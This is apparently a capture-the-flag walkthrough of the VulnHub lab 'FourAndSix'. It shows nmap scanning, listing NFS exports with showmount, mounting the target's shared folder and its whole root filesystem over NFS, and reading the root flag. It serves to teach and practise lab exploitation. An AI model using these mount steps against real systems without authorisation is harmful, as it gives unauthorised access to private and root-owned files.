									FourAndSix is a CTF challenge uploaded by Fred on vulnhub. You can download it from here.
The aim of this lab is to capture a flag in the root directory.
This lab was very confusing to even begin with due to the lack of description by the author. So, on the basis of our experience, we have progressed in the lab. 
Steps involved:

Port scanning and discovery of ports.
Discovery of the shared folder (misconfigured NFS).
Mounting a directory to see the contents in the shared folder.
Mounting and checking the root directory.
Capturing the flag.

Let’s get started then!
First and foremost we’ll scan the IP address with nmap. In my case, the IP address was: 192.168.1.105.

		
		
			
			
			
			
nmap -A 192.168.1.105
			
				
					
				
					1
				
						nmap -A 192.168.1.105
					
				
			
		

 
 We established from the scan that there is an NFS service running.
Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.
Let us check the people having access to the shared folder.

		
		
			
			
			
			
showmount -e 192.168.1.105
			
				
					
				
					1
				
						showmount -e 192.168.1.105
					
				
			
		


We see that everyone has access to the shared folder.
Now for the sake of checking what is in the shared folder, we’ll create a directory in the /tmp folder to mount contents of the shared folder.

		
		
			
			
			
			
cd /tmp
mkdir raj
mount -t nfs 192.168.1.105:/shared /tmp/raj
cd raj
ls
			
				
					
				
					12345
				
						cd /tmpmkdir rajmount -t nfs 192.168.1.105:/shared /tmp/rajcd rajls
					
				
			
		

We have received an image file in our new directory.

Let’s try and mount this image file to see the contents in it.

		
		
			
			
			
			
mkdir usbstick
mount USB-stick.img usbstick
cd usbstick/
ls -la
			
				
					
				
					1234
				
						mkdir usbstickmount USB-stick.img usbstickcd usbstick/ls -la
					
				
			
		


But we obtained nothing useful at all.
Let’s check and see if the root directory is shareable or not.

		
		
			
			
			
			
mkdir main
mount 192.168.1.105:/ main
cd main
ls -la
			
				
					
				
					1234
				
						mkdir mainmount 192.168.1.105:/ maincd mainls -la
					
				
			
		

 
Yes! It indeed is shareable.
Let’s move in the root directory now.

		
		
			
			
			
			
cd root
ls -la
			
				
					
				
					12
				
						cd rootls -la
					
				
			
		

We see a text file called proof.txt!

		
		
			
			
			
			
cat proof.txt
			
				
					
				
					1
				
						cat proof.txt
					
				
			
		


Voila! We have obtained the flag! Happy hacking!
